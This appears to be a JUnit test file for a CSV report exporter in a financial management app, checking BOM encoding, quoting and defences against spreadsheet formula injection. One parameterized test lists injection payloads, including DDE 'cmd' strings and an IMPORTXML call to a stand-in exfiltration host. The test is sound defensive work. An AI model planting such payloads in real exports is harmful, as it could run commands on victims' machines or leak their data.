package com.emanudev.gestaofinanceira.reporting.adapter.out.export;

import static org.assertj.core.api.Assertions.assertThat;

import com.emanudev.gestaofinanceira.reporting.application.ReportRowItem;
import java.io.ByteArrayOutputStream;
import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.time.LocalDate;
import java.util.List;
import java.util.UUID;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class CsvStreamingExporterTest {

    private final CsvStreamingExporter exporter = new CsvStreamingExporter();

    @Test
    void shouldExportCsvWithUtf8BomAndSemicolonDelimiter() {
        UUID entryId = UUID.fromString("0192c8a4-0000-7000-8000-000000000101");
        ReportRowItem row = new ReportRowItem(
                entryId,
                "RECEIVABLE",
                "RECEIVED",
                "Mensalidade Consultoria B2B",
                "Receita de Servicos",
                "Conta Principal",
                "Cliente Alpha S.A.",
                LocalDate.of(2026, 10, 1),
                LocalDate.of(2026, 10, 15),
                LocalDate.of(2026, 10, 14),
                new BigDecimal("12500.50"),
                new BigDecimal("12500.50"),
                "BRL"
        );

        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        exporter.export(List.of(row), outputStream);

        byte[] bytes = outputStream.toByteArray();
        assertThat(bytes).hasSizeGreaterThan(3);
        assertThat(bytes[0]).isEqualTo((byte) 0xEF);
        assertThat(bytes[1]).isEqualTo((byte) 0xBB);
        assertThat(bytes[2]).isEqualTo((byte) 0xBF);

        String csv = new String(bytes, StandardCharsets.UTF_8);
        assertThat(csv).startsWith(CsvStreamingExporter.UTF8_BOM + "ID;Tipo;Status;Descricao;");
        assertThat(csv).contains(
                entryId
                        + ";RECEIVABLE;RECEIVED;Mensalidade Consultoria B2B;Receita de Servicos;"
                        + "Conta Principal;Cliente Alpha S.A.;2026-10-01;2026-10-15;2026-10-14;"
                        + "12500.50;12500.50;BRL"
        );
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "=SUM(A1:A10)",
            "+cmd|'/C calc'!A0",
            "-2+3+cmd|'/C calc'!A0",
            "@IMPORTXML(\"http://malicious.example/exfil\",\"//a\")"
    })
    void shouldNeutralizeCsvFormulaInjectionWithSingleQuotePrefix(String maliciousPayload) {
        ReportRowItem row = new ReportRowItem(
                UUID.fromString("0192c8a4-0000-7000-8000-000000000202"),
                "PAYABLE",
                "PENDING",
                maliciousPayload,
                "=MALICIOUS_CATEGORY()",
                "+MALICIOUS_ACCOUNT",
                "@MALICIOUS_COUNTERPARTY",
                LocalDate.of(2026, 10, 1),
                LocalDate.of(2026, 10, 20),
                null,
                new BigDecimal("500.00"),
                null,
                "BRL"
        );

        String csv = exporter.exportToString(List.of(row));

        assertThat(CsvStreamingExporter.sanitizeFormulaInjection(maliciousPayload))
                .startsWith("'" + maliciousPayload);
        assertThat(csv)
                .contains("'=MALICIOUS_CATEGORY()")
                .contains("'+MALICIOUS_ACCOUNT")
                .contains("'@MALICIOUS_COUNTERPARTY");
    }

    @Test
    void shouldQuoteCellsContainingDelimiterOrQuotes() {
        ReportRowItem row = new ReportRowItem(
                UUID.fromString("0192c8a4-0000-7000-8000-000000000303"),
                "PAYABLE",
                "OVERDUE",
                "Nota Fiscal; Lote \"Especial\" 01",
                "Impostos",
                "Conta Caixa",
                "Receita Federal",
                LocalDate.of(2026, 10, 1),
                LocalDate.of(2026, 10, 10),
                null,
                new BigDecimal("6000.00"),
                null,
                "BRL"
        );

        String csv = exporter.exportToString(List.of(row));

        assertThat(csv).contains("\"Nota Fiscal; Lote \"\"Especial\"\" 01\"");
    }
}
